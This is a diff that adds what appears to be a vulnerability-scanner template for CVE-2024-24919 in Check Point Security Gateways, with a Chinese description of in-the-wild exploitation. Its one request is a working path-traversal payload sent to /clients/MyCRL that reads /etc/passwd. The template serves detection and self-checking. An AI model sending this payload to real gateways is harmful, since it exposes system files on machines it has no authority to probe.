@@ -1,0 +1,26 @@
+id: CheckPoint-MyCRL-File-reading
+
+info:
+  name: Check Point 安全网关任意文件读取漏洞(CVE-2024-24919)
+  author: unknown
+  severity: medium
+  description: Check Point Security Gateways 任意文件读取漏洞(CVE-2024-24919)存在在野利用，远程攻击者可以通过构造恶意请求读取服务器上的任意文件，造成敏感信息的泄漏。目前，此漏洞已检测到在野利用。鉴于该漏洞影响范围较大，建议客户尽快做好自查及防护。
+  tags: File reading
+  
+http:
+  - raw:
+      - |
+        POST /clients/MyCRL HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        aCSHELL/../../../../../../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+      - type: status
+        status: 
+          - 200
